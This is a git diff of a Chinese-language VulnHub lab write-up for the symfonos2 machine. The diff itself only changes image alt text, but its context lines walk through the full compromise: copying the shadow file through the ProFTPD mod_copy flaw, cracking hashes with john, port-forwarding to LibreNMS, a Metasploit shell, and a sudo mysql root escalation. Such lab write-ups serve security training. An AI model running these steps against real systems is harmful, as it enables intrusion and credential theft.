@@ -39,7 +39,7 @@ OSCP-like Intermediate real life based machine designed to teach the importance 
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.149` 就是目标了
 
@@ -48,7 +48,7 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.149
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/2.png)
 
 21、22、80、139、445
 
@@ -57,9 +57,9 @@ nmap -T5 -A -v -p- 192.168.141.149
 enum4linux 192.168.141.149
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/3.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/4.png)
 
 找到一个 `/anonymous` 文件夹和 2个用户,进去看看文件
 ```bash
@@ -70,26 +70,26 @@ ls
 get log.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/5.png)
 
 查看下 log.txt 可以发现很多线索
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/6.png)
 
 开头告诉你 shadow 内容在 backups 目录下,然后后面是 smb 的配置,有个密码
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/7.png)
 
 然后开始看 ftp 的配置,配置文件说明了是 ProFTPD 程序，还告诉你有个 aeolus 账号
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/8.png)
 
 想起来之前 nmap 扫描 FTP 得到的版本号是 1.3.5,也许可以找找漏洞
 ```bash
 searchsploit -w proftpd 1.3.5
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/9.png)
 
 这3个都一样,漏洞编号为 CVE-2015-3306,但是这个漏洞只是可以复制文件,并不能直接进行命令执行,并且需要知道目标路径
 
@@ -99,7 +99,7 @@ searchsploit -w proftpd 1.3.5
 
 这里我们从 log.txt 中可以得知 anonymous 用户的实际路径为 `/home/aeolus/share`,加上开头告诉你 shadow 文件在 backup 目录下,接下来就尝试将 backup目录下的 shadow 复制到 anonymous 用户目录下
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/10.png)
 
 ```bash
 ftp 192.168.141.149
@@ -107,7 +107,7 @@ site cpfr /var/backups/shadow.bak
 site cpto /home/aeolus/share/shadow.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/11.png)
 
 成功了,上 smb 下载下来
 ```bash
@@ -118,7 +118,7 @@ exit
 cat shadow.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/12.png)
 
 下面用同样的方式下载 passwd 文件
 ```bash
@@ -138,7 +138,7 @@ unshadow passwd.txt shadow.txt > hash.txt
 cat hash.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/13.png)
 
 使用 john 开始跑 hash
 ```bash
@@ -146,7 +146,7 @@ gunzip /usr/share/wordlists/rockyou.txt.gz
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/14.png)
 
 只跑出 aeolus 一个用户的密码,使用这个凭证成功 SSH 上去
 ```
@@ -160,11 +160,11 @@ sudo -l
 find / -perm -u=s 2>/dev/null
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/15.png)
 
 没成功,看看 web 方面
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/16.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/16.png)
 
 又是啥都没有,直接翻 web 配置文件看看
 ```bash
@@ -172,14 +172,14 @@ cd /etc/apache2
 cat apache2.conf
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/17.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/17.png)
 
 看看这个端口监听文件
 ```bash
 cat ports.conf
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/18.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/18.png)
 
 端口 8080 有个无法从外部访问的网站,端口转发一下
 ```bash
@@ -188,18 +188,18 @@ socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080
 
 现在 8080 可以通过 5000 端口访问
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/19.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/19.png)
 
 找找有没有可利用的漏洞
 ```bash
 searchsploit -w librenms
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/20.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/20.png)
 
 看了下,需要认证,结果用 aeolus  sergioteamo 可以登上去,那就用 msf 模块试试
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/21.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/21.png)
 
 ```bash
 msfconsole
@@ -213,7 +213,7 @@ set PASSWORD sergioteamo
 run
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/22.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/22.png)
 
 ---
 
@@ -225,13 +225,13 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 sudo -l
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/23.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/23.png)
 
 可以在 gtfobin 找到 mysql 提权的方法 https://gtfobins.github.io/gtfobins/mysql/
 ```
 sudo mysql -e '\! /bin/sh'
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/24.png)
+![](../../../../../assets/img/安全/实验/VulnHub/symfonos/symfonos2/24.png)
 
 提权成功,感谢靶机作者 Zayotic,和 mzfr 分享的 writeup
